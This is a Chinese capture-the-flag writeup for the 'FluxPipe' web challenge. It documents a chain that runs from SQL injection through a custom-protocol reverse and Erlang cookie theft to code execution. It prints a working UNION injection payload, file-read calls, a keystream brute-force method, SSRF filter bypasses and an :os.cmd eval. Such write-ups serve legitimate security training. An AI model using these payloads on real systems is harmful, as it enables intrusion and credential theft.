# FluxPipe (羊城杯 Web) Writeup

> **Flag: `DASCTF{30252849541544858022442464806510}`**
>
> 靶机: `http://1.14.76.59:29590`（容器 4000 端口）
> 技术栈: Elixir 1.17 / Plug-Cowboy / PostgreSQL 15 / BEAM OTP 27
> 用时: 约 2.5 小时

---

## 0x00 摘要

一道五漏洞串联的 Web 综合题。平台本身是个"实时数据流管道配置平台"FluxPipe，
表面只有 4 个 GET 接口，实际藏着 SSRF、FPX 自定义二进制协议、ETS 信息泄露和
`Code.eval_string` 代码执行。设计文档（附件里的 `problem.json`）直接列出了
5 个漏洞点，是最大的提示：

```
SQL注入(Ecto raw query拼接) / 信息泄露(Debug端点+ETS表) /
自定义协议逆向(FPX XOR-Rotate) / 侧信道攻击(CRC校验oracle) / 代码注入(Code.eval_string)
```

攻击链：**SQLi 拿 API key → 换 Bearer token → FPX 握手 → CRC oracle 绕过校验
→ XOR-Rotate 密钥流恢复 → read_ets 拿 erlang_cookie → eval 命令 RCE → /readflag**。

---

## 0x01 信息收集

### 首页与 health

首页是静态 HTML，footer 提示 `API docs at /api/v1/health`。health 接口直接
泄露内部架构：

```json
{"node":"fluxpipe@127.0.0.1","status":"healthy","epmd_port":4369,
 "services":{"fpx_protocol":"listening:4001","pipeline_engine":"running",
             "postgresql":"connected"},
 "beam_version":"27","distribution":"enabled","uptime_seconds":...}
```

关键线索：**FPX 自定义协议服务监听在容器 4001 端口**（外部不可达）。

### 路由枚举

GET + POST 双方法 × SecLists raft-medium（63k 词）全量 fuzz，加上 self
组合字典，得到完整路由表：

| 方法 | 路径 | 说明 |
|---|---|---|
| GET | `/` | 静态首页 |
| GET | `/api/v1/health` | 信息泄露 |
| GET | `/api/v1/pipelines` | 管道列表（5 条） |
| GET | `/api/v1/pipelines/search?q=&status=` | **SQL 注入点** |
| POST | `/api/v1/pipelines/export` | SSRF（异步，无回显） |
| POST | `/api/v1/debug/eval` | 代码执行（生产环境禁用） |
| POST | `/api/v1/auth` | API key 校验 |

`debug/eval` 返回 `SandboxError: code execution disabled in production`，
并提示 **"Use FPX protocol for debug commands"** —— 强行指路 FPX 协议。

### 隐藏路由（从 BEAM 字面量反查）

常规字典 fuzz 全部 404。后来用 SQLi 的 `pg_read_binary_file` 把
`Elixir.Fluxpipe.Router.beam` 拖下来解析 LitT（literal）chunk，才发现：

```
/api/v1/fpx/handshake   /api/v1/fpx/command
/api/v2/admin/users|config|exec   /graphql   /live/websocket
/api/v1/debug/metrics   /.env
```

`/.env` 还放了假凭据钓鱼（`FPX_SECRET=not_the_real_secret_haha`、
`ERLANG_COOKIE=monster`）。

---

## 0x02 SQL 注入（突破口）

`GET /api/v1/pipelines/search` 用 Ecto raw query **字符串拼接**。用 NUL 字节
触发 Postgres 协议错误，可泄露完整 SQL：

```
q=%00  →  500 {"error":"Query error: ERROR 08P01 ... 
              query: SELECT id, name, description, status FROM pipelines 
                     WHERE 1=1 AND name ILIKE '%<NUL>%'"}
```

对比两个参数的转义行为：

| 参数 | 转义 | 结论 |
|---|---|---|
| `q` | `'`→`''`、`%`→`\%`、`_`→`\_` | 安全 |
| `status` | **无任何转义** | **可注入** |

> 踩坑：一开始看 `status='\x00''` 以为引号被转义成 `''`，其实那两个引号是
> 「我们输入的引号 + 模板闭合引号」。浪费了约 2 小时在 q 参数上。
> 判别方法：输入 `a'b` 看 SQL 里是 `a''b`（转义）还是 `a'b`（未转义）。

注入 payload：

```
status=' UNION SELECT 1,(SELECT api_key FROM users WHERE role='admin')::text,'x','y'-- -
```

返回 `{"id":1,"name":"AJ2BUIHB8hF0VOqaMWSBXyebSgMNgn7",...}`。

顺带把 4 张表（users / pipelines / transform_rules / alert_policies）全 dump 了，
`users` 表结构：`id, username, password_hash, role, api_key`。

还试了 `pg_read_file('/flag.txt')` → Permission denied（文件存在但 postgres
用户无权读），`pg_ls_dir('/')` 看到 `/readflag`（setuid root）和 `/readflag.c`。

---

## 0x03 认证与 FPX 握手

```bash
POST /api/v1/auth   {"api_key":"AJ2BUIHB8hF0VOqaMWSBXyebSgMNgn7"}
→ {"token":"f74d75fda936985ad63d0960aa1dab94","role":"admin"}

POST /api/v1/fpx/handshake   Authorization: Bearer <token>
→ {"protocol":"FPX/1.0","session_id":"a69e35162d2db499",
   "nonce_hint":"3ea63778...????????????????????????"}
```

---

## 0x04 FPX 协议逆向

### 帧格式（Router.beam 字面量）

```
magic(2)=FB AE | cmd(1) | len(2) | payload(len) | crc16(2)
```

整个帧 **hex 编码**后放在 JSON body：

```json
{"session_id":"...","frame":"FBAE0100000020"}
```

### CRC 校验 oracle（题目点名的侧信道）

CRC 错误时服务端**回显期望值**：

```json
{"error":"Frame decode error: CRC mismatch: expected C071, got 0"}
```

直接把期望值填进 CRC 字段重发即可，零成本绕过。顺带收集 (帧, CRC) 对
拟合算法（自定义 CRC16，标准多项式都对不上）—— 但有 oracle 就不用拟合了。

### 命令映射

| cmd | 功能 | payload |
|---|---|---|
| 0x01 | `list_ets` | 无 |
| 0x02 | `read_ets` | 表名（xor-rotate 加密） |
| 0x03 | `node_info` | 无 → 返回 node / cookie_hash / epmd_names |
| 0x04 | `eval` | `cookie\|code`（xor-rotate 加密） |

### XOR-Rotate 加密

`router` 字面量写着 `encoding: xor-rotate-nonce`、`nonce_source: sha256(erlang_cookie)[0:16]`。
实测加密为：

```
enc[i] = rotl(p[i] ^ key[i % 16], i % 8)      # rotl 循环左移低 8 位
dec[i] = rotr(c[i], i % 8) ^ key[i % 16]
```

**密钥流恢复**（不依赖逆向 BEAM 字节码）：eval 命令按 `|` 切分 payload，
切出 2 段就报 `Invalid cookie`（否则报 `Eval format: cookie|code`）。
于是对每个位置 i，发长度为 i+1 的 payload、只变第 i 个字节，扫 0..255，
哪个字节返回 `Invalid cookie` 就说明它解密成了 `|`（0x7C）。16 个位置
× 256 = 4096 个请求，并发 8 线程约 1 分钟扫完。

得到 16 对明文-密文对后，按 `key[i] = rotr(c_i, i%8) ^ 0x7C` 解出密钥：

```
KEY = [0x3E,0xA6,0x37,0x78,0xF4,0xDB,0x35,0x31,0x50,0x26,0x3F,0x2B,0x9F,0x82,0x0D,0x31]
```

> 踩坑：ETS 表名**不带冒号**。`list_ets` 显示的 `:logger` 是 Elixir 的
> atom inspect 格式，实际 payload 要发 `logger`。

---

## 0x05 读 ETS → 拿 cookie → RCE

加密后调 `read_ets("pipeline_secrets")`：

```json
{"command":"read_ets","table":"pipeline_secrets","entries":[
  ["fpx_master_key","<<62,166,55,120,244,219,53,49,80,38,63,43,159,130,13,49,...>>"],
  ["admin_api_key","AJ2BUIHB8hF0VOqaMWSBXyebSgMNgn7"],
  ["erlang_cookie","sSxn4lrqzQqk218XmvR96VxxVMKm1pxW"]
]}
```

`fpx_master_key` 的前 16 字节就是 nonce —— 与我们恢复的密钥流完全一致，互为印证。

最后 eval 命令（payload = `cookie|code` 加密后发送）：

```python
payload = enc(b"sSxn4lrqzQqk218XmvR96VxxVMKm1pxW|:os.cmd('/readflag')")
# cmd 0x04
```

返回：

```json
{"command":"eval","result":"~c\"DASCTF{30252849541544858022442464806510}\\n\""}
```

> `/readflag` 是 `readflag.c` 编译出的 setuid root 程序，`setuid(0)` 后读
> `/flag.txt`。postgres 用户读不到 flag.txt，但执行 setuid 二进制可以。

---

## 0x06 一键利用

见同目录 `exploit.py`，纯标准库、自带重试，完整跑通上述 7 步：

```
[+] admin api_key: AJ2BUIHB8hF0VOqaMWSBXyebSgMNgn7
[+] bearer token: 469d0e53d33e132576a4935718811dc3
[+] fpx session: 3f86f6ce26e37193
[+] erlang_cookie: sSxn4lrqzQqk218XmvR96VxxVMKm1pxW
[+] FLAG: DASCTF{30252849541544858022442464806510}
```

---

## 0x07 踩坑记录

1. **系统代理污染**：本机全局走代理，curl 打靶机频繁 502 `upstream connect
   failed`，必须 `--noproxy '*'` 或 Python 里用直连 `http.client`。
2. **status 参数转义判断失误**：错误信息里的 `''` 是「用户引号 + 模板闭合
   引号」，不是转义。判别要用 `a'b` 这种夹心输入看 SQL 拼接结果。
3. **隐藏路由 fuzz 不到**：`/api/v1/fpx/handshake`、`command` 不在任何常规
   字典里。正解是把 `Router.beam` 用 `pg_read_binary_file` 拖下来解析
   BEAM 的 LitT chunk（zlib 解压后直接 strings 就能看到路径字面量）。
4. **ETS 表名带不带冒号**：`list_ets` 输出是 inspect 格式（`:logger`），
   `read_ets` 的 payload 要用原始 atom 名（`logger`）。
5. **CRC 不用逆向**：错误信息回显期望值，oracle 直接给答案。
6. **export 接口是盲 SSRF**：`target_url` 过滤可绕（`0.0.0.0`/`[::1]`/
   十进制 IP），支持 gopher，但任务异步且无回显 —— 本题没用上，正解走的是
   SQLi → FPX 的 HTTP 面。
7. **BEAM 逆向不需要 disassembler**：`strings` + 解析 AtU8（atom 表）和
   LitT（字面量，zlib 压缩）就能拿到全部协议规格、命令名、错误文案。

---

## 0x08 文件清单

| 文件 | 说明 |
|---|---|
| `exploit.py` | 一键利用脚本（SQLi → auth → FPX → eval → flag） |
| `wp.md` | 本文档 |
